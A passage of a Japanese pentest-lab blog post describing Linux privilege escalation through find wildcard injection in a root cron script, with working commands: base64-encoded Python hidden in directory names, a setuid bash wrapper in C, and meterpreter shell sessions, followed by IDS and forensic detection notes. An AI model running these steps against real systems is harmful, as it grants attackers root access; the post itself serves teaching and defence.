ただ、今回ECShopが稼働しているサーバにはPythonが入っていました。</p>

<p>Pythonやperlなど、高機能なコマンドが入っていると侵害に非常に役に立ちます。<br />
スペースやスラッシュなんてbase64エンコードしてしまえばいいのです。</p>

<p>ということで、できあがったものがこちらです。</p>

<pre><code>mkdir &quot;* -exec python -c exec('[base64エンコードしたpythonコード]'.decode('base64')) ;&quot;
</code></pre>

<p>スペースもスラッシュも使いませんし、これで任意のpythonコードも、OSコマンドも実行できます。</p>

<p><br/></p>

<h4 id="試しにディレクトリ作成">試しにディレクトリ作成</h4>

<p>1度にtouchコマンドを2回使ってaaa、bbbディレクトリを作成してみます。</p>

<p>os.systemを使えばOSコマンドが実行できます。</p>

<pre><code>&gt;&gt;&gt; &quot;import os;os.system('touch aaa; touch bbb')&quot;.encode(&quot;base64&quot;)
'aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==\n'
</code></pre>

<p>⚠️危険⚠️なディレクトリを作成し、vuln.shを実行します。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ=='.decode('base64')) ;&quot;
shu@kali:/tmp/images$ bash vuln.sh
(snip)
</code></pre>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./find_test_python.png" alt="./find_test_python.png"/>
    </div>
    <a href="./find_test_python.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>ディレクトリが作成されていることがわかります。</p>

<p><br/></p>

<h1 id="wildcard-injection-を使って権限昇格する">Wildcard Injection を使って権限昇格する</h1>

<p>おまたせしました。ここでやっとVictim環境で権限昇格です。</p>

<p>これまでの内容で、findを使って任意のOSコマンドが実行できることがわかりました。<br />
そして今回は bakProductImage.sh が root 権限で実行されてそうなこともわかっています。<br />
今までの材料を使って権限昇格を試みます。</p>

<h3 id="bashラッパーを作成">bashラッパーを作成</h3>

<p>以下のコードのファイルを作成します。</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

int main()
{
	setuid(geteuid());
	system(&quot;/bin/bash&quot;);
	return 0;
}
</code></pre>

<p>victimに送信し、コンパイルします。</p>

<pre><code>meterpreter &gt; upload bash_wrapper.c /tmp/.session
[*] uploading  : bash_wrapper.c -&gt; /tmp/.session
[*] uploaded   : bash_wrapper.c -&gt; /tmp/.session/bash_wrapper.c
meterpreter &gt; shell
Process 10068 created.
Channel 16 created.

gcc -o w ./bash_wrapper.c

ls -l ./w
-rwxr-xr-x 1 www-data www-data 6976 May 12 15:43 ./w
</code></pre>

<p>ラッパーが作成されました。</p>

<h3 id="ラッパーの権限を操作するディレクトリを作成">ラッパーの権限を操作するディレクトリを作成</h3>

<p>次に、ラッパーの所有者をrootにしてsuidを付与する⚠️危険⚠️なディレクトリを作成します。<br />
作成先は、bakProductImage.sh のfind対象である /var/www/html/images 配下です。</p>

<p>まずはbase64エンコード。<br />
「chown root /tmp/.session/w; chmod u+s /tmp/.session/w」というコマンドを実行するPythonコードをbase64エンコードします。</p>

<pre><code>&gt;&gt;&gt; &quot;import os;os.system('chown root /tmp/.session/w; chmod u+s /tmp/.session/w')&quot;.encode(&quot;base64&quot;)
'aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ==\n'
</code></pre>

<p>ディレクトリを作成します。</p>

<pre><code>meterpreter &gt; shell
Process 10076 created.
Channel 17 created.

mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ=='.decode('base64')) ;&quot;
</code></pre>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./escalation_images_dir.png" alt="./escalation_images_dir.png"/>
    </div>
    <a href="./escalation_images_dir.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>作成できました。</p>

<p>なおfindに対してWildcard Injectionをするときは、コードが 255 文字を超えないように気をつけてください。<br />
大体のファイルシステムは、名前の最大長が 255 文字であるため、コードが長すぎると作成できません。</p>

<p>255文字を超える恐れがあるなら、予め別のシェルスクリプトを作成し、injection時はそのスクリプトを呼ぶようにすればいいです。</p>

<p>あとは 翌日 1 時の cron の実行を待つだけです！</p>

<hr />

<h4 id="翌日1時">～翌日1時～</h4>

<p>1時になったので、ラッパーファイルの状態を見てみます。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./escalation_success_dir.png" alt="./escalation_success_dir.png"/>
    </div>
    <a href="./escalation_success_dir.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>見事ラッパーファイルの所有者がrootになってsuidがついていますね。
更新日時も1時になっています。</p>

<p>早速アクセスします。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./escalation_success_whoami.png" alt="./escalation_success_whoami.png"/>
    </div>
    <a href="./escalation_success_whoami.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>画像の通り root 権限になっています。</p>

<p><strong>権限昇格成功です💪</strong></p>

<p>あとはmeterpreterを接続するなりしてなんでも好きなことができます。</p>

<p><br/></p>

<hr />

<h1 id="攻撃の痕跡">攻撃の痕跡</h1>

<h2 id="ids">IDS</h2>

<p>WSOやmeterpreterの接続など、初期侵入の部分は検知してくれました。<br />
ただ、meterpreter接続後は全く検知しませんでした。</p>

<p>入口対策、および初期侵入の検知時にいかに対応できるかが侵害発見のポイントになりそうです。</p>

<p>検知シグネチャは以下のとおり。</p>

<p><br/></p>

<h4 id="et-attack-response-wso-webshell-activity-wso-title">ET ATTACK_RESPONSE WSO - WebShell Activity - WSO Title</h4>

<p>WSOの各操作のレスポンスで検知しました。</p>

<h4 id="et-policy-executable-and-linking-format-elf-file-download">ET POLICY Executable and linking format (ELF) file download</h4>

<p>meterpreter にスイッチするためにmeterpreter stageをダウンロードするので、その時のバイナリを検知しました。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./ids_meterpreter_stager.png" alt="./ids_meterpreter_stager.png"/>
    </div>
    <a href="./ids_meterpreter_stager.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p><br/></p>

<h3 id="ファイルシステム">ファイルシステム</h3>

<p>攻撃者は、全てのアクションは最初に侵入したユーザの権限の範囲内でのみ行なえます。</p>

<p>今回はwww-dataユーザだったので、以下のディレクトリに書き込みが可能でした。</p>

<ul>
<li>/tmp</li>
<li>/var/tmp</li>
<li>/var/www/html</li>
<li>/var/run/apache2</li>
<li>/run/apache2</li>
</ul>

<p>侵害調査には 各tmpディレクトリを洗い出すのはもはや常識ですが、思わぬところに書き込み権限があり、攻撃者がそれを利用している可能性もあります。<br />
なので /var/www/html など、tmpの他に侵害ユーザが書き込み可能なディレクトリも全て洗い出すべきですね。</p>

<p>下記findコマンドでwww-dataが書き込み可能なディレクトリを調べられます。</p>

<pre><code class="language-shell">find / \( -perm -002 -o -user www-data -o -group www-data \) -type d
</code></pre>

<p><br/>
また、攻撃者は今回/tmp/.sessionを作業ディレクトリにしました。<br />
ドットファイル/ドットディレクトリはlsコマンド単体では出てこないので注意。<br />
(ls -aやfindなら出てくる）</p>

<p><br/></p>

<h4 id="tmp-bc">/tmp/bc</h4>

<p>WSO のリバースコネクト用バイナリ。<br />
WSOのリバースコネクトは、作成するファイル形式をCバイナリかperlスクリプトか選べます。<br />
Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作成します。</p>

<p><br/></p>

<h4 id="tmp-session-w">/tmp/.session/w</h4>

<p>権限昇格用バイナリ。suidがついているので大変わかりやすいです。</p>

<p>find で suid が付与されているファイルを洗い出せば出てきます。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./forensics_find_suid.png" alt="./forensics_find_suid.png"/>
    </div>
    <a href="./forensics_find_suid.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>一つだけ/tmpに存在するのでバレバレですね。<br />
攻撃者は/usr/bin/ や /bin/ にファイルを作成できないのでこんなことになるのです。</p>

<p><br/></p>

<h4 id="var-www-html-images-exec-python-c-exec-aw1-略-kq-decode-base64">/var/www/html/images/* -exec python -c exec(&lsquo;aW1(略)KQ==&rsquo;.decode(&lsquo;base64&rsquo;)) ;</h4>

<p>もはやネタ。<br />
攻撃者は何回も実行されないように一回実行されたら削除しますが、当然痕跡としては残ります。<br />
フォレンジック時、「-exec」を含むファイル/ディレクトリを探すといいかもしれません。</p>

<p><br/></p>

<h3 id="プロセス">プロセス</h3>

<p>侵害調査時、万が一攻撃者が活動してて鉢合わせたらプロセスですぐにわかります。</p>

<p>以下は「ps auxwf」の結果です。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./forensics_ps.png" alt="./forensics_ps.png"/>
    </div>
    <a href="./forensics_ps.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>以下の流れであることがひと目でわかりますね。</p>

<ol>
<li>WSOでリバースコネクト</li>
<li>meterpreter の stager</li>
<li>meterpreter (/tmp/Xeokj)</li>
<li>権限昇格用バイナリ ./w (root権限)</li>
<li>./w が root 権限で bash を起動</li>
</ol>

<p><br/>
攻撃者としては鉢合わせないように、常にnetstat(ss)やpsに目を光らせておく必要がありますね。</p>

<hr />

<h2 id="コラム-というか雑記">コラム（というか雑記）</h2>

<p>find に対する Wildcard Injection の解説はどこよりも詳しく書けたんじゃないかな・・・</p>

<p>というのも、この脆弱性には縁があるのです。</p>

<p>2017年にPaloAlto の NGFWである PAシリーズで、root 権限で RCE可能な脆弱性 (CVE-2017-15944) が見つかりました。</p>

<blockquote>
<p><a href="http://www.security-next.com/088709">http://www.security-next.com/088709</a></p>
</blockquote>

<p>そして、当時SOCアナリストだった私はこの脆弱性のPoCが公開される前に自分で検証してrootを取ることができました。
そして検証の結果なかなかにやばい脆弱性ということがわかったので記事にしたのです。（記事はCVEでググってください）</p>

<p>そのCVE-2017-15944 についてですが、これは今回と同じくログを定期バックアップするシェルスクリプトに脆弱性があり、
同様に find コマンドの Wildcard Injection の脆弱性でした。</p>

<blockquote>
<p><a href="https://seclists.org/fulldisclosure/2017/Dec/38">https://seclists.org/fulldisclosure/2017/Dec/38</a></p>
</blockquote>

<p>この脆弱性を調査する過程で Wildcard Injectionを学んだのですが、当時は記事の速報性を重視したために攻撃の原理を書けず悔しい思いをしたので、ここでまとめてかくことにしました。</p>

<p>これで成仏できます。😇</p>

<hr />

<p>今回はAD侵害までいけず、Linux環境の権限昇格のところまででした。
次こそADにいきたいですが、フォワーディングだけで終わりそう</p>

<p>以上。</p>

        
          <div class="blog-tags">
            
              <a href="https://www.shutingrz.com//tags/pentest/">pentest</a>&nbsp;
            
              <a href="https://www.shutingrz.com//tags/priv_escalation/">priv_escalation</a>&nbsp;
            
              <a href="https://www.shutingrz.com//tags/ethical_hacking/">ethical_hacking</a>&nbsp;
            
          </div>
        

        
            <hr/>
            <section id="social-share">
              <div class="list-inline footer-links">
                

<div class="share-box" aria-hidden="true">
    <ul class="share">
      
      <li>
        <a href="//twitter.com/share?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;text=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86&amp;via=shutingrz" target="_blank" title="Share on Twitter">
          <i class="fab fa-twitter"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//plus.google.com/share?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f" target="_blank" title="Share on Google Plus">
          <i class="fab fa-google-plus"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f" target="_blank" title="Share on Facebook">
          <i class="fab fa-facebook"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//reddit.com/submit?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;title=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86" target="_blank" title="Share on Reddit">
          <i class="fab fa-reddit"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;title=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86" target="_blank" title="Share on LinkedIn">
          <i class="fab fa-linkedin"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;title=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86" target="_blank" title="Share on StumbleUpon">
          <i class="fab fa-stumbleupon"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;description=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86" target="_blank" title="Share on Pinterest">
          <i class="fab fa-pinterest"></i>
        </a>
      </li>
    </ul>
  </div>
  
              </div>
            </section>
        

        
          
          
          <h4 class="see-also">See also</h4>
          <ul>
          
            <li><a href="/post/ad_hack-ec_exploit/">ペネトレ検証-ECサイトに侵入</a></li>
          
            <li><a href="/post/hugo-notice-banner/">記事に特定のタグがあったら「悪用禁止」と表示されるようにしてみた</a></li>
          
          </ul>
          
        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://www.shutingrz.com/post/ad_hack-ec_exploit/" data-toggle="tooltip" data-placement="top" title="ペネトレ検証-ECサイトに侵入">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://www.shutingrz.com/post/can-training-first/" data-toggle="tooltip" data-placement="top" title="シミュレーション環境でCAN通信を試す">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

    <footer>
  
    
      
    
      
    
      
  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css" />
  <script src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js"></script>
  <script>
    window.addEventListener("load", function(){
    window.cookieconsent.initialise({
      "palette": {
        "popup": {
          "background": "#000"
        },
        "button": {
          "background": "#f1d600"
        }
      },
      "content": {
        "message": "本Webサイトのセキュリティ情報は、サイバー空間の安心・安全な環境を確保する目的で公開しています。ここで知り得た情報は決して悪用しないでください。",
        "dismiss": "OK",
        "href": "/pages/about-disclosure-security-information/"
      }
    })});
  </script>
      
    
  

  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
                <a href="https://github.com/shutingrz" title="GitHub">
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
                <a href="https://twitter.com/shutingrz" title="Twitter">
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
          <li>
            
            <a href="https://www.shutingrz.com/index.xml" title="RSS">
            
              <span class="fa-stack fa-lg">
                <i class="fas fa-circle fa-stack-2x"></i>
                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              <a href="www.shutingrz.com">しゅーと</a>
            
          

          &nbsp;&bull;&nbsp;&copy;
          
            2019
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://www.shutingrz.com/">Shooting!!!</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="http://gohugo.io">Hugo v0.55.6</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
          
        </p>
	<p class="credits theme-by text-muted">
	  本サイトではアクセス解析に Google Analytics を利用しています
	</p>
      </div>
    </div>
  </div>
</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

<script src="https://www.shutingrz.com/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://www.shutingrz.com/js/load-photoswipe.js"></script>









  </body>
</html>

